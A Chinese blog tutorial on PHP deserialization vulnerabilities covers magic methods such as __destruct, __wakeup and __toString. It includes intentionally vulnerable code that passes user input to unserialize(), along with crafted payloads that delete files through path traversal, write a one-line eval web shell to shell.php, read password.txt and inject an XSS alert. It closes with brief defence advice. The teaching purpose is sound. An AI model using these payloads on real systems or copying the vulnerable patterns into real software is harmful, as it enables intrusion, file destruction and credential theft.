{"blogid": "123338591", "writerAge": "码龄3年", "writerBlogNum": "29", "writerCollect": "267", "writerComment": "40", "writerFan": "193", "writerGrade": "3级", "writerIntegral": "452", "writerName": "一句话木马", "writerProfileAdress": "writer_image\\profile_123338591.jpg", "writerRankTotal": "83599", "writerRankWeekly": "360443", "writerThumb": "81", "writerVisitNum": "96093", "blog_read_count": "11051", "blog_time": "于 2022-03-07 23:55:48 发布", "blog_title": "反序列化漏洞详解", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\">一、什么是序列化和反序列化</a></p>\n<p id=\"%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\">二、什么是反序列化漏洞</a></p>\n<p id=\"%E4%B8%89%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%88serialize%EF%BC%89-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%B8%89%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%88serialize%EF%BC%89\">三、序列化函数（serialize）</a></p>\n<p id=\"%C2%A0%E5%9B%9B%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)-toc\" style=\"margin-left:0px;\"><a href=\"#%C2%A0%E5%9B%9B%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28unserialize%29\">四、反序列化(unserialize)</a></p>\n<p id=\"%E2%80%8B%E4%BA%94%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFPHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-toc\" style=\"margin-left:0px;\"><a href=\"#%E2%80%8B%E4%BA%94%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFPHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\">​五、什么是PHP魔术方法</a></p>\n<p id=\"%E5%85%AD%E3%80%81%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-toc\" style=\"margin-left:0px;\"><a href=\"#%E5%85%AD%E3%80%81%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\">六、一些常见的魔术方法</a></p>\n<p id=\"%E4%B8%83%E3%80%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%B8%83%E3%80%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8\">七、魔术方法的利用</a></p>\n<p id=\"%C2%A0%E5%85%AB%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8-toc\" style=\"margin-left:0px;\"><a href=\"#%C2%A0%E5%85%AB%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8\"> 八、反序列化漏洞的利用</a></p>\n<p id=\"1.__destruct()%E5%87%BD%E6%95%B0-toc\" style=\"margin-left:40px;\"><a href=\"#1.__destruct%28%29%E5%87%BD%E6%95%B0\">1.__destruct()函数</a></p>\n<p id=\"2.__wakeup()-toc\" style=\"margin-left:40px;\"><a href=\"#2.__wakeup%28%29\">2.__wakeup()</a></p>\n<p id=\"3.toString()-toc\" style=\"margin-left:40px;\"><a href=\"#3.toString%28%29\">3.toString()</a></p>\n<p id=\"%E2%80%8B%E4%B9%9D%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1-toc\" style=\"margin-left:0px;\"><a href=\"#%E2%80%8B%E4%B9%9D%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1\">​九、反序列化漏洞的防御</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<p></p>\n<h1 id=\"%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\">一、什么是序列化和反序列化</h1>\n<p>序列化是将对象转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序列化会将字符串转换为对象供程序使用。在PHP中序列化和反序列化对应的函数分别为serialize()和unserialize()。</p>\n<h1 id=\"%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\">二、什么是反序列化漏洞</h1>\n<p>当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p>\n<h1 id=\"%E4%B8%89%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0%EF%BC%88serialize%EF%BC%89\">三、序列化函数（serialize）</h1>\n<p>当我们在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，用于保存对象的值方便之后的传递与使用。</p>\n<p>测试代码</p>\n<pre><code class=\"language-php\">&lt;?php \n class Stu{\n    public $name = 'aa';\n    public $age = 18;\n    public function demo(){\n        echo \"你好啊\";\n    }\n$stu = new Stu();\necho \"&lt;pre&gt;\";\nprint_r($stu);\n//进行序列化\n$stus = serialize($stu);\nprint_r($stus);\n}\n\n?&gt;</code></pre>\n<p>查看结果：</p>\n<p><img alt=\"\" height=\"341\" src=\"image\\e50d106bfd8f460d9e5feb9b4b282f00.png\" width=\"696\"/></p>\n<h1 id=\"%C2%A0%E5%9B%9B%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)\">四、反序列化(unserialize)</h1>\n<p>        unserialize()可以从序列化后的结果中恢复对象（object）为了使用这个对象，在下列代码中用unserialize重建对象.</p>\n<p>测试代码：</p>\n<pre><code class=\"language-php\">&lt;?php \n\t//定义一个Stu类\n\tclass Stu\n\t{\t\n\t\t//定义成员属性\n\t\tpublic $name = 'aa';\n\t\tpublic $age = 19;\n\t\t//定义成员方法\n\t\tpublic function demo()\n\t\t{\n\t\t\techo '你吃了吗';\n\t\t}\n\t}\n\t//实例化对象\n\t$stu = new Stu();\n\t//进行序列化\n\t$stus = serialize($stu);\n\tprint_r($stus);\n\techo \"&lt;br&gt;&lt;pre&gt;\";\n\t//进行反序列化\n\tprint_r(unserialize($stus));\n ?&gt;</code></pre>\n<p>查看结果：</p>\n<h1 id=\"%E2%80%8B%E4%BA%94%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFPHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><img alt=\"\" height=\"209\" src=\"image\\a03ddd7839854b9093f3dcc38eee6846.png\" width=\"724\"/>五、什么是PHP魔术方法</h1>\n<p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。</p>\n<h1 id=\"%E5%85%AD%E3%80%81%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\">六、一些常见的魔术方法</h1>\n<ul><li>__construct() :构造函数，当创建对象时自动调用。</li><li>__destruct():析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。</li><li>__wakeup():进行unserialize时会查看是否有该函数，有的话有限调用。会进行初始化对象。</li><li>__ toString():当一个类被当成字符串时会被调用。</li><li>__sleep():当一个对象被序列化时调用，可与设定序列化时保存的属性。</li></ul>\n<h1 id=\"%E4%B8%83%E3%80%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8\">七、魔术方法的利用</h1>\n<p>测试代码：</p>\n<pre><code class=\"language-php\">&lt;?php\n  class Stu\n    {\n       public $name = 'aa';\n       public $age = 18;\n       \n      function __construct()\n      {\n        echo '对象被创建了__consrtuct()';\n      }\n      function __wakeup()\n      {\n        echo '执行了反序列化__wakeup()';\n      }     \n       function __toString()\n      {\n        echo '对象被当做字符串输出__toString';\n        return 'asdsadsad';\n      }\n      function __sleep()\n      {\n        echo '执行了序列化__sleep';\n        return array('name','age');\n      }\n      function __destruct()\n      {\n        echo '对象被销毁了__destruct()';\n      }\n\n    } \n    $stu =  new Stu();\n    echo \"&lt;pre&gt;\";\n   //序列化\n    $stu_ser = serialize($stu);\n    print_r($stu_ser);\n    //当成字符串输出\n    echo \"$stu\";\n   //反序列化\n    $stu_unser = unserialize($stu_ser);\n    print_r($stu_unser);\n?&gt;\n </code></pre>\n<p> 测试结果：</p>\n<p><img alt=\"\" height=\"230\" src=\"image\\1ed2658309a346148fb56ad8dc949d68.png\" width=\"1200\"/></p>\n<h1 id=\"%C2%A0%E5%85%AB%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8\"> 八、反序列化漏洞的利用</h1>\n<p>由于反序列化时unserialize()函数会自动调用wakeup(),destruct(),函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制<span style=\"color:#fe2c24;\">序列化的字符串</span>时会去触发他们，从而达到攻击。</p>\n<h2 id=\"1.__destruct()%E5%87%BD%E6%95%B0\">1.__destruct()函数</h2>\n<p>个网站内正常页面使用logfile.php文件，代码中使用unserialize()进行了反序列化，且反序列化的值是用户输入可控 。正常重构Stu对象</p>\n<p>测试代码：</p>\n<pre><code class=\"language-php\">&lt;?php \n\theader(\"content-type:text/html;charset=utf-8\");\n\t//引用了logfile.php文件\n\tinclude './logfile.php';\n\t//定义一个类\n\tclass Stu\n\t{\n\t\tpublic $name = 'aa';\n\t\tpublic $age = 19;\n\t\tfunction StuData()\n\t\t{\n\t\t\techo '姓名:'.$this-&gt;name.'&lt;br&gt;';\n\t\t\techo '年龄:'.$this-&gt;age;\n\t\t}\n\t}\n\t//实例化对象\n\t$stu = new Stu();\n\t//重构用户输入的数据\n\t$newstu = unserialize($_GET['stu']);\n\t//O:3:\"Stu\":2:{s:4:\"name\";s:25:\"&lt;script&gt;alert(1)&lt;/script&gt;\";s:3:\"age\";i:120;}\n\techo \"&lt;pre&gt;\";\n\tvar_dump($newstu) ;\n ?&gt;</code></pre>\n<p>logfile.php 代码：</p>\n<pre><code class=\"language-php\">&lt;?php \n\tclass LogFile\n\t{\n\t\t//日志文件名\n\t\tpublic $filename = 'error.log';\n\t\t//存储日志文件\n\t\tfunction LogData($text)\n\t\t{\n\t\t\t//输出需要存储的内容\n\t\t\techo 'log some data:'.$text.'&lt;br&gt;';\n\t\t\tfile_put_contents($this-&gt;filename, $text,FILE_APPEND);\n\t\t}\n\t\t//删除日志文件\n\t\tfunction __destruct()\n\t\t{\n\t\t\t//输出删除的文件\n\t\t\techo '析构函数__destruct 删除新建文件'.$this-&gt;filename;\n\t\t\t//绝对路径删除文件\n\t\t\tunlink(dirname(__FILE__).'/'.$this-&gt;filename);\n\t\t}\n\t} \n ?&gt;</code></pre>\n<p>正常输入参数：O:3:\"Stu\":2:{s:4:\"name\";s:2:\"aa\";s:3:\"age\";i:20;}</p>\n<p><img alt=\"\" height=\"303\" src=\"image\\da7df5da82844dffac6214dc03257247.png\" width=\"869\"/>重构logfile.php文件包含的对象进行文件删除 </p>\n<ul><li> 正常重构：O:7:\"LogFile\":1:{s:8:\"filename\";s:9:\"error.log\";}</li><li><img alt=\"\" height=\"177\" src=\"image\\e77201beda2b48b8b1b134e6f40548c8.png\" width=\"827\"/></li><li><img alt=\"\" height=\"272\" src=\"image\\039fc272e98842b29aff874c9193ed93.png\" width=\"942\"/></li></ul>\n<p> 发现正常删除，但如果我们修改参数，让其删除其他的文件呢？</p>\n<ul><li>异常重构：O:7:\"LogFile\":1:{s:8:\"filename\";s:10:\"../ljh.php\";}</li><li><img alt=\"\" height=\"431\" src=\"image\\57e9e1650b2d42f4a168f10a3e1b8ae5.png\" width=\"934\"/></li><li>执行该代码</li><li><img alt=\"\" height=\"282\" src=\"image\\33d4b864c161444582f2e93b7b9d229d.png\" width=\"917\"/></li></ul>\n<h2 id=\"2.__wakeup()\">2.__wakeup()</h2>\n<p>例如有一个代码为index.php，源码如下</p>\n<pre><code class=\"language-php\">&lt;?php \n\tclass chybeta\n\t{\n\t\tpublic $test = '123';\n\t\tfunction __wakeup()\n\t\t{\n\t\t\t$fp = fopen(\"shell.php\",\"w\") ;\n\t\t\tfwrite($fp,$this-&gt;test);\n\t\t\tfclose($fp);\n\t\t}\n\t}\n\t$class = @$_GET['test'];\n\tprint_r($class);\n\techo \"&lt;/br&gt;\";\n\t$class_unser = unserialize($class);\n\t\n\t// 为显示效果，把这个shell.php包含进来\n    require \"shell.php\";\n ?&gt;</code></pre>\n<p> 传入参数：?test=O:7:\"chybeta\":1:{s:4:\"test\";s:19:\"&lt;?php phpinfo(); ?&gt;\";}</p>\n<p><img alt=\"\" height=\"397\" src=\"image\\0f70e3829e554c57b401ce4367adc3cc.png\" width=\"1200\"/></p>\n<p> 查看shell.php文件</p>\n<p><img alt=\"\" height=\"69\" src=\"image\\265fdfcbb5cb47049eb663cf36dc4f7d.png\" width=\"438\"/></p>\n<p>也可以传入一句话木马：O:7:\"chybeta\":1:{s:4:\"test\";s:25:\"&lt;?php eval($_POST[1]); ?&gt;\";}</p>\n<h2 id=\"3.toString()\">3.toString()</h2>\n<p>举个例子，某用户类定义了一个__toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许 __toString读取某个文件。把下面这段代码保存为fileread.php</p>\n<p>fileread.php代码</p>\n<pre><code class=\"language-php\">&lt;?php \n\t//读取文件类\n\tclass FileRead\n\t{\n\t\tpublic $filename = 'error.log';\n\t\tfunction __toString()\n\t\t{\n\t\t\treturn file_get_contents($this-&gt;filename);\n\t\t}\n\t}\n ?&gt;</code></pre>\n<p> 个网站内正常页面应引用fileread.php文件，代码中使用unserialize()进行了反序列化，且反序列化的值是用户输入可控 。</p>\n<p>测试代码：</p>\n<pre><code class=\"language-php\">&lt;?php \n\t//引用fileread.php文件\n\tinclude './fileread.php';\n\t//定义用户类\n\tclass User\n\t{\n\t\tpublic $name = 'aa';\n\t\tpublic $age = 18;\n\t\tfunction __toString()\n\t\t{\n\t\t\treturn '姓名:'.$this-&gt;name.';'.'年龄:'.$this-&gt;age;\n\t\t}\n\t}\n\t//O:4:\"User\":2:{s:4:\"name\";s:2:\"aa\";s:3:\"age\";i:18;}\n\t//反序列化\n\t$obj = unserialize($_GET['user']);\n\t//当成字符串输出触发toString\n\techo $obj;\n ?&gt;</code></pre>\n<p> 正常重构：O:4:\"User\":2:{s:4:\"name\";s:2:\"aa\";s:3:\"age\";i:18;}</p>\n<p> <img alt=\"\" height=\"196\" src=\"image\\862d22aa486548e2b2120045cb005752.png\" width=\"1000\"/></p>\n<p>重构fileread.php文件包含的类进行读取password.txt文件内容</p>\n<p>重构：O:8:\"FileRead\":1:{s:8:\"filename\";s:12:\"password.txt\";}</p>\n<h1 id=\"%E2%80%8B%E4%B9%9D%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1\"><img alt=\"\" height=\"293\" src=\"image\\5c0e19fda2214ff29b82972d7784eca7.png\" width=\"1016\"/>九、反序列化漏洞的防御</h1>\n<p>和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以最好的预防措施: </p>\n<ol><li> 不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。</li><li>在进入反序列化函数之前,对参数进行限制过滤。</li></ol>\n<p> </p>\n</div>\n</div>"}